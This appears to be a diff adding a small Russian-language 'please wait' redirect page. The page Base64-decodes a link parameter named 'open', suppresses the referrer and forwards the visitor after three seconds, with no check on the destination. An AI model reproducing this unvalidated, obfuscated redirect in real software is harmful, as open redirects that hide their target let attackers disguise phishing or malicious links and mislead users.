@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <title>Перенаправление...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 15%; background: #f9f9f9; }
+    </style>
+</head>
+<body>
+    <p>Пожалуйста, подождите, идет загрузка страницы...</p>
+    <script>
+        // Функция берет параметр из ссылки, расшифровывает Base64 и редиректит через 3 секунды
+        const urlParams = new URLSearchParams(window.location.search);
+        const encoded = urlParams.get('open');
+        if (encoded) {
+            setTimeout(() => {
+                window.location.replace(atob(encoded));
+            }, 3000); // 3000 миллисекунд = 3 секунды задержки
+        }
+    </script>
+</body>
+</html>
